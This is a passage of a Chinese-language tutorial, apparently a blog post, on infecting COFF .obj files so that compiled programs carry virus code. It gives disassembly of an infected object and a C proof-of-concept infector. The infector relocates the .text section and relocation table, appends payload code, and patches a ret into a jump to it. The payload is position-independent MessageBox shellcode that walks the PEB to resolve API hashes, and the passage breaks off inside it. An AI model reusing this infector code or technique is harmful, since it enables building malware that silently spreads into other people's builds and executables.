
虽然`.text`的代码部分长度并不包括重定位部分长度，且包括指向段内重定位表偏移的指针，链接器可以根据原有那个表进行重定位操作，但实际情况是，链接器会因为你的修改，把原有数据重定位弄错误，在IDA中观察是没有问题的，但最终生成的EXE文件是完全混乱的。

所以我的一个猜测是段结构中的重定位偏移仅是提供给外部程序解析参考用的（如IDA，`dumpbin`），而链接器只接受默认`.text`后面就是重定位表的事实。所以为了能执行成功，我们还是把重定位部分拷贝过去，所以我们新增数据的长度是以上3部分的长度总和。

### 3. 修改原有代码，使其跳向病毒代码。

`_main`:
```
00000000: 68 00 00 00 00     push        offset \_main
00000005: E8 00 00 00 00     call        0000000A
0000000A: 59                 pop         ecx
0000000B: C3                 ret ----------------\
0000000C: 90                 nop                 |
0000000D: 90                 nop                 |
0000000E: 90                 nop                 |
0000000F: 90                 nop                 |
... 注意此处是重定位表的数据，要跳过该部分长度   |                                                |
                                                   |
000000xx: nop <----------------------------------/
000000xx: nop
000000xx: nop
...virus code
```

### 4. 返回原代码部分

简单的情况，可直接在病毒代码中`ret`返回即可，宿主情况复杂的话，需要计算好偏移重新跳回去。

### 5. 感染后的情况

`SECTION HEADER #2`

`.text name`

`0 physical address`

`0 virtual address`

`D9 size of raw data`                     ----> 长度已经被重新计算

`26D file pointer to raw data`             ----> 指向了文件末尾

`EA file pointer to relocation table`     ----> 没有修改原有重定位表

`0 file pointer to line numbers`

`2 number of relocations`

`0 number of line numbers`

`60501020 flags`

`Code`

`Communal; sym= \_main`

`16 byte align`

`Execute Read`

`_main`:
```
00000000: 68 00 00 00 00     push        offset \_main
00000005: E8 00 00 00 00     call        0000000A
0000000A: 59                 pop         ecx
0000000B: EB 1C              jmp         00000029  -------------------\
0000000D: 00 00              add         byte ptr [eax],al            |
0000000F: 00 01              add         byte ptr [ecx],al            |
00000011: 00 00              add         byte ptr [eax],al            |
00000013: 00 0D 00 00 00 06  add         byte ptr ds:[6000000h],cl    |
00000019: 00 06              add         byte ptr [esi],al            |
0000001B: 00 00              add         byte ptr [eax],al            |
0000001D: 00 0A              add         byte ptr [edx],cl            |
0000001F: 00 00              add         byte ptr [eax],al            |
00000021: 00 14 00           add         byte ptr [eax+eax],dl        |
00000024: 68 65 6C 6C 90     push        906C6C65h                    |
00000029: 90                 nop   <----------------------------------/    跳向了我们想要执行的代码
0000002A: 90                 nop
0000002B: 90                 nop
0000002C: 90                 nop
0000002D: 90                 nop
0000002E: 90                 nop
0000002F: 90                 nop
00000030: 90                 nop
00000031: FC                 cld
00000032: 68 6A 0A 38 1E     push        1E380A6Ah
00000037: 68 63 89 D1 4F     push        4FD18963h
0000003C: 68 32 74 91 0C     push        0C917432h
00000041: 8B F4              mov         esi,esp
00000043: 8D 7E F4           lea         edi,[esi-0Ch]
...
```

`[0x05] .code`

代码演示的部分仅弹出一个`MessageBox`，我比较懒，所以偷懒用`failwest`的一个`shellcode_popup_general`代码（thx ^\_^）稍作修改。

```c
//------------------------------------------------------------------------------
#include <stdio.h>
#include <string.h>
#include <malloc.h>
void vir_code(void);
void vir_code_end(void);
int main(int argc, char* argv[])
{
  FILE            *h = 0;
  unsigned char *buf = 0;
  int        numread = 0;
  int              i = 0;
  int         f_size = 0;
  int       vir_size = 0;
  int         a_size = 0;
  int        tx_off = 0;
  // coff-obj 文件头结构
  typedef struct _coff_obj_header
  {
    short int magic;
    short int sections;
    long      t_stamp;
    long      symbol_to_pointer;
    long      symbol_to_number;
    short int optional_header;
    short int ***s;
  }coff_obj_header;
  typedef struct _sec_hdr
  {
    char c_name[8];              // 段名
    unsigned long  ul_v_size;    // 虚拟大小
    unsigned long  ul_v_addr;    // 虚拟地址
    unsigned long  ul_sec_size;  // 段长度
    unsigned long  ul_sec_off;   // 段数据偏移
    unsigned long  ul_rel_off;   // 段重定位表偏移
    unsigned long  ul_lno_off;   // 行号表偏移
    unsigned short ul_num_rel;   // 重定位表个数
    unsigned short ul_num_ln;    // 行号表长度
    unsigned long  ul_flags;     // 段标识
  }sec_hdr;
  typedef struct _reloc_s
  {
    unsigned long  ul_off;        // 定位偏移
    unsigned long  ul_symbol;     // 符号
    unsigned short us_type;       // 定位类型
  }reloc_s;
  coff_obj_header coh_buf;
  sec_hdr              sh;
  long            tx_rel_off;
  long            tx_rel_len;
  long            txt_len;
  long            txt_off;
  if (argc <2)
  {
    printf("please enter the obj file path to infection\n");
    return 0;
  }
  if (0 == (h = fopen(argv[1],"r+")))
  {
    printf("the file %s was not opened\n",argv[2]);
    return 0;
  }
  fseek(h,0,SEEK_END);
  f_size = ftell(h);
  fseek(h,0,SEEK_SET);
  numread  = fread(&coh_buf,sizeof (coff_obj_header),1,h);
  for(i = 0 ; i < coh_buf.sections;i++)
  {
    fread(&sh,sizeof(sec_hdr),1,h);
    if (0 == strnicmp(".text",sh.c_name,5))
    {
      tx_off  = sizeof(coff_obj_header) + i * sizeof(sec_hdr);
      txt_off = sh.ul_sec_off;
      txt_len = sh.ul_sec_size;
      //读取重定位表数据
      tx_rel_off = sh.ul_rel_off;
      tx_rel_len = sh.ul_num_rel * sizeof(reloc_s);
      break;
    }
  }
  // 构造一个新的obj缓冲区
  vir_size = (int)((int)&vir_code_end - (int)&vir_code);
  a_size   = f_size + vir_size + tx_rel_len + 1;
  buf      = (unsigned char *)malloc(a_size);
  memset(buf,0,f_size + vir_size +1);
  fseek(h,0,SEEK_SET);
  fread(buf,sizeof(unsigned char),f_size,h);
  fclose(h);
  h = 0;
  // 修改text节的执行
  // 将原有.text数据定位的文件尾部
  printf("buff + f_size :%0x\n",buf + f_size);
  memcpy(buf + f_size,buf + txt_off,txt_len);
  // copy重定位表
  memcpy(buf + f_size + txt_len,buf + tx_rel_off,tx_rel_len);
  // copy virus
  memcpy(buf + f_size + txt_len + tx_rel_len,vir_code,vir_size);
  // 修改.text节代码偏移
  //sh.ul_sec_size
  (*(unsigned long *)(buf + tx_off + 8 + 4 + 4))     = txt_len + vir_size + 9;
  //sh.ul_sec_off
  (*(unsigned long *)(buf + tx_off + 8 + 4 + 4 + 4)) = f_size;
  // 修改原有ret指令，跳过重定位表，此处需要反汇编引擎支持，搜索0xc3，定位要修改的jmp 位置，POC演示直接定位.
  (*(unsigned char *)(buf + f_size + 0x0b)) = 0xeb;
  (*(unsigned long *)(buf + f_size + 0x0c)) = (txt_len - 0xc) + tx_rel_len - 1;
  // 加入ret指令返回，或跳转会宿主
  // ...
  // 写入一个新的obj
  if(0 ==(h = fopen("t_obj.obj","wb")))
  {
    printf("the file t_obj.obj was not created\n");
    return 0;
  }
  fwrite(buf,sizeof(unsigned char),a_size,h);
  fclose(h);
  return 1;
}
__declspec(naked) void vir_code(void)
{
  _asm{
      nop
      nop
      nop
      nop
      nop
      nop
      nop
      nop
      nop
      CLD               ; clear flag DF
                        ;store hash
      push 0x1e380a6a   ;hash of MessageBoxA
      push 0x4fd18963   ;hash of ExitProcess
      push 0x0c917432   ;hash of LoadLibraryA
      mov esi,esp       ; esi = addr of first function hash
      lea edi,[esi-0xc] ; edi = addr to start writing function
      ; make some stack space
      xor ebx,ebx
      mov bh, 0x04
      sub esp, ebx
                        ; push a pointer to "user32" onto stack
      mov bx, 0x3233    ; rest of ebx is null
      push ebx
      push 0x72657375
      push esp
      xor edx,edx
      ; find base addr of kernel32.dll
      mov ebx, fs:[edx + 0x30]
      mov ecx, [ebx + 0x0c]
      mov ecx, [ecx + 0x1c]
      mov ecx, [ecx]
      mov ebp, [ecx + 0x08]
    find_lib_functions:
      lodsd
```
